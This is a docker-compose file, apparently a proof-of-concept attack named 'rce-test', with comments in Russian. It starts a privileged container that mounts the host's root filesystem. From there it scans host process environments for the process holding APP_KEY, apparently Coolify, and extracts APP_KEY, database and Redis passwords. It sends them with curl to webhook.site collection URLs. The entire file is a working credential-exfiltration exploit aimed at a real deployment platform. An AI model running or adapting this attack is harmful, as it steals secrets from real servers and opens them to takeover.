version: '3.8'
services:
  rce-test:
    image: 'alpine:3.19'
    privileged: true
    network_mode: host
    volumes:
      - '/:/host-root'
    command:
      - sh
      - -c
      - |
        apk add --no-cache curl
        
        # 1. Ищем PID процесса coolify по наличию APP_KEY в памяти
        PID=$(grep -rl "APP_KEY" /host-root/proc/*/environ 2>/dev/null | head -1 | cut -d'/' -f5)
        echo "Found PID: $PID" | curl -X POST --data-binary @- https://webhook.site/НОВЫЙ-URL?stage=debug_pid
        
        # 2. Если PID найден, вытаскиваем переменные окружения
        if [ -n "$PID" ]; then
          tr '\0' '\n' < /host-root/proc/$PID/environ | grep -E "APP_KEY|DB_PASSWORD|DB_USERNAME|REDIS_PASSWORD" > /tmp/secrets.txt
        fi
        
        # 3. Отправляем результат
        if [ -s /tmp/secrets.txt ]; then
          cat /tmp/secrets.txt | curl -X POST --data-binary @- https://webhook.site/355e60a9-7cfe-4155-a971-cfd5a66cc919stage=secrets
        else
          echo "EXTRACTION_FAILED" | curl -X POST --data-binary @- https://webhook.site/355e60a9-7cfe-4155-a971-cfd5a66cc919?stage=secrets
        fi
        
        sleep 3600
